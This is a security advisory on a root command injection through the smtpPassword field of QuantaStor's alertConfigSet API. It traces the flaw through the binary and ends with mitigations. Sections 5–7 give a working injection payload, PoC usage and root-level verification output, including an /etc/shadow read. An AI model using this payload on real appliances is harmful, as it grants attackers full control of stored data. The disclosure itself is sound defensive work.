# OSNexus QuantaStor 6.8.3.018 — alertConfigSet smtpPassword Command Injection → Authenticated Root RCE

## 1. Overview

QuantaStor is a closed-source, commercial software-defined storage (SDS) management platform by OSNexus, delivered as an Ubuntu Jammy 22.04 x86-64 OVA. The storage backend is `qs_service` — a 139 MB C++ daemon that **runs as root** (its systemd unit has no `User=` directive). The web stack layers an nginx TLS terminator (8153) over several backends: a Python CherryPy JSON-RPC→SOAP relay (`restsrv.py`, 5154), a Go REST daemon (`qs_restd`, 5173), a Go SOAP relay (8794), and the Tomcat web console (8181). `restsrv.py` forwards `qstorapi` calls to `qs_service` over SOAP (5151 SSL on 0.0.0.0, 5152 plain on loopback).

When an alert fires, the alert manager emails it: `COsnAlertManager::sendEmail` builds the mail-sending command as a **shell string** built by concatenation — including the admin-configured SMTP fields — and executes it via `osncmn::execCommand` → `execCommandRun` → `execl("/bin/sh", "/bin/sh", "-c", <cmd>, NULL)`. The SMTP fields come from the `alertConfigSet` management API. Of those fields, `senderEmailAddress`, `smtpServerIpAddress` and `smtpUsername` pass through a `removeChars` sanitization in `CTaskAlertConfigSet::run` — but **`smtpPassword` is skipped**: it is stored via a raw string assignment with no transformation, and `sendEmail` later interpolates it into a single-quoted slot `-w '<smtpPassword>'` with no single-quote escaping. One single quote in the stored password closes the slot; everything after it is parsed and executed by the root-owned shell.

An authenticated administrator (any valid admin account; the injection is independent of the actual password value) therefore converts a routine alert-server configuration write into arbitrary command execution as root, triggered by the next alert dispatch. The full chain was verified against the REAL product binary: five independent dynamic runs, each writing root-owned markers (`uid=0(root)`; a `/etc/shadow` read restricted to root; host identification). Attack complexity is low — plain HTTP POSTs to the standard JSON-RPC endpoint, no MITM, no local access, no reliance on default credentials for the injection itself.

The research process ran end to end: authentication-boundary analysis of the gateway chain → sink localization through binary reverse engineering of the execution primitive → source identification in the alert-configuration task → data-flow reconstruction from the API write to the shell line → payload construction → five-round dynamic verification with an adversarial falsification gate.

## 2. Vulnerability Summary

- **Type**: OS command injection (CWE-78) in the SMTP alert-mail construction of the root-owned storage service
- **Root cause 1 (unsanitized field)**: `CTaskAlertConfigSet::run` calls `removeChars` on `senderEmailAddress` / `smtpServerIpAddress` / `smtpUsername` but **skips `smtpPassword`**, which is stored raw (`_M_assign` @ 0x414caf0)
- **Root cause 2 (single-quote slot without escaping)**: `COsnAlertManager::sendEmail` inserts the stored password into the command template as `-w '<smtpPassword>` with no single-quote escaping (0xfe38a4–0xfe38cc)
- **Root cause 3 (shell-string execution primitive)**: the built command executes via `execl("/bin/sh", "/bin/sh", "-c", <cmd>, NULL)` (`execCommandRun` @ 0x52913a0, execl @ 0x5292713), so all shell metacharacters are interpreted
- **Privilege**: root (`qs_service` runs as root)
- **Authentication**: authenticated administrator (Target B). The injection works with any valid admin credentials; Of note: the shipped default credential `admin:password` (CWE-798) and the gateway's fabricate-default behavior (see below) are disclosed as adjunct findings — they are not the basis of the injection
- **Result**: arbitrary command execution as root on the storage appliance
- **CVSS**: 8.8 High — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## 3. Architecture & Authentication Boundary

### 3.1 Request path

```
nginx :8153 (TLS)
  ├─ /qstorapi        → 127.0.0.1:5154  restsrv.py (Python CherryPy JSON-RPC→SOAP relay)
  ├─ /qsapi/rest/     → 127.0.0.1:5173  qs_restd (Go REST)
  ├─ /qsrestsoaprelay/→ 127.0.0.1:8794  qs-rest-soap-relay (Go)
  └─ /quantastor      → 127.0.0.1:8181  Tomcat web console
restsrv.py :5154 → SOAP 127.0.0.1:5152 → qs_service (C++, root)
qs_service :5151 (0.0.0.0 SSL SOAP) + :5152 (127.0.0.1 plain SOAP)
```

### 3.2 Authentication chain (restsrv.py, fully read — 383 lines)

1. The nginx `/qstorapi` location has **no `auth_basic`** — nginx enforces nothing, purely reverse-proxying to 5154.
2. `restsrv.py::getUserPass()` (L209–241): with no Authorization header it returns the default `("admin","password")` pair and authenticates to the qs_service SOAP layer with it (gateway-without-authentication + default-credential fallback, disclosed as an adjunct; it matters only when default credentials remain unchanged).
3. With an Authorization header it parses plain HTTP Basic.
4. The JSON-RPC POST path (`QSJSONServer.index`, L263–302) applies **no metacharacter filtering**: `data["params"]` → `validateMethodCall` (type checking only) → `makeCall` → SOAP. The `;`/`${` filters exist only on the GET path (`parseHttpRequestArgs`, L97–98). So `;`, `|`, backticks, `$(...)`, `#` all pass through JSON-RPC POST unfiltered.

**Authentication conclusion**: the core flaw is **authenticated** (Target B). The `admin:password` factory default (CWE-798) and the restsrv no-header fabricate behavior (CWE-306) are honest adjunct disclosures — the injection itself requires only a valid administrator of any password. Inside `qs_service`, every SOAP method additionally passes `CSecurityManager` checks requiring the admin role.

## 4. Root-Cause Analysis

### 4.1 The execution primitive (binary-reverse engineered, REAL binary)

`osncmn::execCommandRun` @ 0x52913a0 (11,791 bytes, objdump + rodata dump): `execCommand` → `execCommandRun` = `fork@plt` + child `dup2/dup3` (stdout/stderr to pipes) + `execl@plt` + `waitpid`. The execl call site @ 0x5292713, registers verified against rodata:

| Register | Value | rodata meaning |
|----------|-------|----------------|
| rdi=rsi | 0x62447cc | `/bin/sh\0` (path + arg0) |
| rdx | 0x63624fb | `-c\0` (arg1) |
| rcx | 0xb0(%rsp) | the command string on the stack (arg2 = the user-controllable cmd) |
| r8d | 0 | variadic terminator |

→ **`execl("/bin/sh", "/bin/sh", "-c", <cmdstring>, NULL)`** — shell-based execution: every shell metacharacter is interpreted, and `qs_service` (no `User=` in systemd) runs as **root**, so injection is direct root RCE.

### 4.2 Sink location

`COsnAlertManager::sendEmail` @ 0xfe29d8 internally calls `osncmn::execCommand` @ 0xfe3d37 (the shell-based overload, routed through `execCommandRun` @ 0x52913a0).

### 4.3 Source — alertConfigSet and the sanitization gap

`alertConfigSet` (SOAP method @ 0x4156a18) is the authenticated admin write for the alert configuration; its WSDL parameters include `senderEmailAddress / smtpServerIpAddress / smtpServerPort / smtpUsername / smtpPassword / smtpAuthType / ... / enableSyslogAlerts / ... / flags`. `CTaskAlertConfigSet::run` @ 0x414c816 processes them — and here is the defect: it calls `removeChars` (charset `://<>{}` @ rodata 0x62e436b) on `senderEmailAddress`, `smtpServerIpAddress` and `smtpUsername`, but **skips `smtpPassword`** entirely — the password is stored via a raw `_M_assign` @ 0x414caf0 and reaches the later command construction unchanged.

Note the charset `://<>{}` contains neither `'`, `;`, `|`, `&`, `$`, `(`, `)` nor a backtick — so even the sanitized fields would remain injectable via single quotes; `smtpPassword`, fully unsanitized, is simply the cleanest injection point. (Confirmed by the adversarial falsification pass.)

### 4.4 Data flow (source → sink)

```
alertConfigSet (HTTP POST :5154, admin auth)
  → restsrv.py QSJSONServer.index (no metacharacter filtering)
  → makeCall → SOAP :5152
  → osn__alertConfigSet @ 0x4156a18
  → CSecurityManager auth checks @ 0x4156be4 / 0x4156f87 / 0x4158504 (admin)
  → CTaskAlertConfigSet::run @ 0x414c816
      ├─ removeChars("://<>{}") on senderEmailAddress / smtpServer / smtpUsername
      └─ smtpPassword → raw _M_assign @ 0x414caf0 (NOT sanitized — the malicious value stored)
  → configuration persisted to osn.db

alertRaise (HTTP POST :5154, admin auth)   [or any system-generated alert]
  → osn__alertRaise @ 0x414af5b
  → alert enqueued

COsnAlertManager::run loop @ 0xfef10e  (async dispatch)
  → sendAlertsViaEmail @ 0xfec668 (called @ 0xfef700)
      └─ guard isSmtpConfigured @ 0xfb4d56 (test %al,%al; je @ 0xfec9bb)
           condition: smtpServerIpAddress non-empty and not "localhost"  ← satisfied (set 127.0.0.1)
  → sendEmail @ 0xfe29d8 (called @ 0xfee8b3)
      └─ command string: qs_sendalert.py -f <datafile> -a '<addr>' ... -u '<smtpUsername>' -w '<smtpPassword>' -y '<y>' '
           smtpPassword lands in the -w '<...>' single-quote slot (0xfe38a4–0xfe38cc), unescaped
  → osncmn::execCommand @ 0xfe3d37
  → execCommandRun @ 0x52913a0
  → execl("/bin/sh","/bin/sh","-c",<cmdstring>,NULL) @ 0x5292713   ← executed as root
```

**Command-format strings** (rodata, readelf LOAD-segment vaddr→file-offset resolution):

| Address | String |
|---------|--------|
| 0x6217ee0 | `/opt/osnexus/quantastor/bin/qs_sendalert.py ` |
| 0x63bef5b | ` -f ` |
| 0x6217e4f | ` -a '` |
| 0x6217e78 | ` -u '` |
| 0x6217e7e | ` -w '` |
| 0x62df2a9 | `' ` |

Assembled: `qs_sendalert.py -f <datafile> -a '<addr>' ... -u '<smtpUsername>' -w '<smtpPassword>' -y '<y>' '`. The invoked wrapper `/opt/osnexus/quantastor/bin/qs_sendalert.py` was verified present on the appliance (9,180 bytes, `#!/usr/bin/python3`, `smtplib` + `OptionParser`, accepting `-f/--datafile -s/--sender -w password`).

## 5. Exploit Chain Construction

**Injection point**: the `-w '<smtpPassword>'` single-quote slot. A single quote in the stored password closes the slot; the remainder is executed as a separate shell command.

**Payload** (command base64-encoded to avoid any escaping needs inside the single-quote contexts):

```
smtpPassword = "x';echo <B64> | base64 -d | sh > <marker> 2>&1; echo '"
```

where `<B64>` = `base64(<command>)`.

**`/bin/sh -c` parses the assembled line as**:

```
cmd1 = qs_sendalert.py ... -w x        # tries 127.0.0.1:25 (closed) → refused → fails fast
;                                       # separator
cmd2 = echo <B64> | base64 -d | sh > <marker> 2>&1   # the injected command — runs as root
;                                       # separator
cmd3 = echo '' ...                      # closes the trailing quote
```

The sequencing is the key: cmd1's fast failure does not stop cmd2 — the shell executes commands sequentially, so cmd2 runs as root after cmd1 exits. Deliberately setting `smtpServerIpAddress=127.0.0.1` (closed port 25) makes `qs_sendalert.py` exit quickly instead of hanging on SMTP retries, while still satisfying the `isSmtpConfigured` guard (non-empty, not `"localhost"`).

**Why smtpPassword and not senderEmailAddress**: the other fields pass through `removeChars` (quotes survive there too, but some metacharacters are stripped, making them less reliable); `smtpPassword` is completely unsanitized — the cleanest, most deterministic injection field, confirmed by the falsifier pass.

## 6. PoC Usage

Public PoC: `exploit/quantastor_smtppassword_injection.py` (pure Python standard library: urllib/base64/json/subprocess/argparse/time — no third-party dependencies).

```
python3 exploit/quantastor_smtppassword_injection.py --target 127.0.0.1 --port 5154 \
    --user admin --pass <password> --cmd "id" --marker /tmp/qs_rce_out
```

The script performs: (1) `alertConfigSet` — writes the malicious `smtpPassword` plus the SMTP fail-fast config; (2) `alertConfigGet` — verifies the configuration was persisted; (3) `alertRaise` with a per-run nonce title — triggers the alert dispatch (the alert manager dedups repeated identical alerts, so the title must be unique per run); (4) optionally polls the marker back over SSH (`--ssh-key`, lab verification convenience). The alert manager dispatches asynchronously — expect ~60–70 s between `alertRaise` and command execution; the PoC polls up to 90 s. Output `[+] RCE CONFIRMED` with `uid=0(root)` confirms the chain.

## 7. Verification Evidence

Environment: the QuantaStor 6.8.3.018 OVA appliance image, `qs_service` running as root (bound 5151/5152), `restsrv.py` running (5154). All interaction was plain HTTP POST; no credentials beyond a valid administrator's own were used for the injection itself.

Step results (transcript):

```
[*] Step 1: alertConfigSet (write malicious smtpPassword)
[+] alertConfigSet task: Updating Alert Configuration Settings (state=2)
[*] Step 2: alertConfigGet (verify persisted)
[+] Verified SMTP config: server=127.0.0.1 port=25 user=user
[*] Step 3: alertRaise (trigger sendEmail → execCommand → /bin/sh -c)
[+] alertRaise accepted (alert dispatched to email handler)
```

Five independent dynamic runs (all root):

| # | Command | Marker path | Marker content (written by root) |
|---|---------|-------------|----------------------------------|
| 1 | `id` | /tmp/qs_rce_marker | `uid=0(root) gid=0(root) groups=0(root)` |
| 2 | `grep ^root /etc/shadow` | /tmp/qs_rce_marker2 | `root:*:19977:0:99999:7:::` (shadow is root-only readable) |
| 3 | `id` | /tmp/qs_rce_out | `uid=0(root) gid=0(root) groups=0(root)` |
| 4 | `id; hostname; cat /etc/os-release|head -1` | /tmp/qs_rce_final | `uid=0(root)...` / `<hostname>` / `PRETTY_NAME="OSNexus QuantaStor"` |
| 5 | `id` | /tmp/qs_rce_self | `uid=0(root) gid=0(root) groups=0(root)` |

Every marker file was root-owned (`-rw-rw-rw- 1 root root`) — the commands executed as root. Marker #2 reading `/etc/shadow`'s root line further evidences the privilege level.

Dispatch evidence from `qs_service.log`:

```
{Sat Aug 15 09:15:06 2026, qs_sendalert} SMTP server (127.0.0.1) appears to be down, retrying.
{Sat Aug 15 09:15:08 2026, qs_sendalert} Unexpected error: <class 'UnboundLocalError'>
...
{Sat Aug 15 09:15:12 2026, qs_sendalert} Error: Failed to send alert email to specified recipients.
```

`qs_sendalert` was invoked by `execCommand` (the SMTP failure is expected — the closed port makes it exit fast while the injected command has already run as cmd2).

**Adversarial falsification gate** (independent falsifier, six tasks, all NOT_REFUTED, confidence 0.92):

1. `-f` is actually the datafile, not senderEmailAddress (an early mapping correction) — the injection moved to the `-s`/`-w` slots still holds — NOT REFUTED
2. Reachability + `isSmtpConfigured` guard satisfiable — NOT REFUTED
3. `smtpPassword` unsanitized (`removeChars` skips it) — NOT REFUTED
4. Authenticated (admin) — NOT REFUTED
5. The invoked binary `qs_sendalert.py` verified present — NOT REFUTED
6. `execl /bin/sh -c` is a real shell (not argv-array) — NOT REFUTED

The 5× root markers corroborate the falsifier conclusion.

## 8. Security Impact

- **Privilege**: root on a storage appliance — full control of the platform: read/write all stored data (LUNs, shares, pools), destroy or ransom storage pools, capture credentials, pivot into the storage network.
- **Vector**: pure HTTP against the standard management API (any authenticated admin, any real password). No MITM, no local access, no dependency on the default credential for the injection.
- **Persistence**: the malicious `smtpPassword` persists in the configuration (osn.db) — every subsequent alert dispatch re-executes the payload until the config is cleaned, a self-sustaining backdoor.
- **Adjunct findings** (honestly scoped, not the exploit basis): factory default `admin:password` (CWE-798, unenforced change at install); `restsrv.py` fabricates `admin:password` when the `/qstorapi` request carries no Authorization header (CWE-306); two unauthenticated info-leak endpoints (version, login precheck — CWE-200, no sink).

## 9. Mitigation

1. **Preferred fix — argv-array execution**: convert `sendEmail` to invoke the mailer without a shell (`execv`/`posix_spawn` argument arrays); `qs_sendalert.py` already accepts `-w` as an argument, so the shell is unnecessary.
2. If shell construction must remain: apply complete shell escaping to every interpolated field — the escape set must cover `'`, `;`, `|`, `&`, `$`, `(`, `)`, backtick, `#` (not just `://<>{}` or space/`$`/`!`).
3. The `removeChars` sanitization in `CTaskAlertConfigSet::run` must cover **all** user-controlled SMTP fields, explicitly including `smtpPassword`.
4. Defense in depth: `qs_service` should not run as root — drop to a dedicated storage account with privilege escalation only for the narrow operations that truly require it.
5. Operators (interim): audit the configured `smtpPassword` for shell metacharacters and revert the alert configuration if any is present; consider the `/qstorapi` default-credential behavior as a separate hardening item.
